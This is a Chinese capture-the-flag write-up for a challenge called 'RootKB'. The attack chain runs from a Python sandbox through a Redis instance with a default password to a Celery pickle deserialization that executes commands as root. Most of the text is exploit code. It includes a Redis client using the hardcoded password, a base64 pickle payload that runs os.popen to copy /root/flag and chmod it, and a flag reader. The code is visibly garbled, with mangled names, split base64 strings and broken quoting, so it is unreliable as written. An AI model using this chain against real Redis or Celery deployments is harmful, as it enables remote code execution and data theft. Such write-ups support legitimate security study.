---
tags: [Redis未授权/默认口令, Pickle反序列化, Celery, 权限提升, Python]
---

# RootKB ―

创建工具处有一个沙箱能执行 python 代码。

沙箱连接 redis ， 密码是默认的， Password123@redis

celery 和 redis通信使用了 pickle， 这里没有 find_class 限制。读取token 的 key：

```
import  socket

class  RedisClient :
def  一init一 (self ,  host= 'localhost ' ,  port=6379) :
self .host  =  host
self .port  =  port
self .socket  =  socket .socket(socket .AF_INET ,  socket .SOCK_STREAM)


def  connect(self) :
"""建立  TCP  连接 " " "
self .socket .connect((self .host ,  self .port))

def  send_command(self ,  command) :
self .socket .sendall((command  +  '\\r\\n ') .encode('utf-8 ')) return  self .parse_response()

def  parse_response(self) :
"""解析  Redis  服务器的响应（基础实现） " " "
response  =  self .socket .recv (4096) .decode('utf-8 ') return  response
def  close(self) :
"""关闭连接 " " "
self .socket .close()

def  exp() :
client  =  RedisClient()
client .connect()

client .send_command("auth  Password123@redis")

#  设置键值对
res  =  client .send_command("keys  * ")

#  res  =  open('/etc/passwd ' ,   'r ') .read()

return  res

result  =  exp
```

写 pickle payload：

```
import  redis
import  base64

def  main() :
#  1 .  连接Redis并进行认证
try :
r  =  redis .Redis(
host= 'localhost ' ,
port=6379 ,
password= 'Password123@redis ' ,  #  如果有ACL用户名 ，加上username= 'your_username

decode_responses=False    #  确保获取的是bytes ，便于处理二进制数据 )
#  测试连接
r .ping()
print("✅   Redis连接成功!")
except  Exception  as  e :
print(f "×  连接Redis时出现错误 :  {e}")
return

#  2 .  准备并存储字节数据try :
#  示例1 :  直接存储字节数据
binary_data  =
base64 .b64decode( 'gASVbgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxSX19pbXBvcnRfXygn b3MnKS5wb3BlbignY2F0IC9yb290L2ZsYWcgPiAvdG1wL2ZsYWcgJiYgY2htb2QgNzc3IC90bXAvZm xhZycpLnJlYWQoKZSFlFKULg= ')
r .set( ' :TOKEN:eyJ1c2VybmFtZSI6ImFkbWluIiwiaWQiOiJmMGRkOGY3MS1lNGVlLTExZWUtOGM 4NC1hOGExNTk1ODAxYWIiLCJlbWFpbCI6IiIsInR5cGUiOiJTWVNURU1fVVNFUiJ9:1vKY0u:xS22i 8t2qsCFdGvIYZ5T565rDDS6rJXd-ppgf7nnsUA ' ,  binary_data)
print("✅  字节数据已存储。 ")

except  Exception  as  e :
print(f "×  存储数据时出现错误 :  {e}")

#  4 .  关闭连接  (可选 ，但推荐)
r .close()
print("连接已关闭。 ")

result  =  main
```

写入后带着 admin 的 cookie 刷新一下触发反序列化。

读 flag：

```
def  exp() :
res  =  open('/tmp/flag ' ,  'r ') .read()
return  res

result  =  exp
```

